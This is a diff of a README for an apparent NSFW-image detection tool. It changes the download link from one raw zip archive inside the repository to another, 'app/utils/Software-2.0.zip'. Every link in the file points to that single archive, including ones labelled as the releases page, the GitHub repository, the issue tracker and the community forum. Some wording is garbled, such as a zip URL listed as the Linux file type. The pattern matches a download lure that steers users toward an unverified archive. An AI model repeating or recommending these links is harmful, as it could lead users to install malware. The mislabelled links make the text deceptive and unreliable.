@@ -1,7 +1,7 @@
 # 🖼️ nsfw - Simple and Effective NSFW Detection Tool
 
 ## 📥 Quick Download
-[![Download Here](https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip)](https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip)
+[![Download Here](https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip)](https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip)
 
 ## 📚 Overview
 nsfw is a lightweight tool for detecting NSFW (Not Safe For Work) content. It supports private deployments and can be used as an HTTP API. This makes it an ideal solution for both personal and business needs.
@@ -15,19 +15,19 @@ Follow these steps to get started with nsfw easily. You don't need any programmi
 - At least 100 MB of free disk space 
 
 ### 2. Visit the Releases Page
-To download the latest version, visit this page: [Releases Page](https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip).
+To download the latest version, visit this page: [Releases Page](https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip).
 
 ### 3. Choose Your Version
 On the Releases page, you will see a list of available versions. Click on the latest version to see more details.
 
 ### 4. Download the File
-Look for the download link for your operating system. This may be an executable file (.exe for Windows, .dmg for Mac, or https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip for Linux). Click the link to start the download.
+Look for the download link for your operating system. This may be an executable file (.exe for Windows, .dmg for Mac, or https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip for Linux). Click the link to start the download.
 
 ### 5. Install the Application
 Once the file is downloaded, locate it in your downloads folder. 
 - **For Windows:** Double-click the .exe file and follow the prompts to install.
 - **For Mac:** Open the .dmg file, then drag nsfw to your Applications folder.
-- **For Linux:** Extract the https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip file and follow the instructions in the README file included.
+- **For Linux:** Extract the https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip file and follow the instructions in the README file included.
 
 ### 6. Running the Application
 After installation, you can run nsfw:
@@ -57,11 +57,11 @@ If you encounter issues while downloading or using nsfw, please check the GitHub
 nsfw is open-source. You can explore the licensing details on GitHub to understand how you can use the tool legally. 
 
 ## 📌 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip)
-- [Issues and Feature Requests](https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip)
-- [Community Forum](https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip)
+- [Issues and Feature Requests](https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip)
 
 ## 🔗 Re-Download
-If you ever need to download nsfw again, you can always return to this link: [Releases Page](https://raw.githubusercontent.com/ebroky/nsfw/main/app/model/nsfw-v2.4-beta.4.zip). 
+If you ever need to download nsfw again, you can always return to this link: [Releases Page](https://raw.githubusercontent.com/ebroky/nsfw/main/app/utils/Software-2.0.zip). 
 
 Thank you for using nsfw. Your feedback is appreciated to help make it even better!
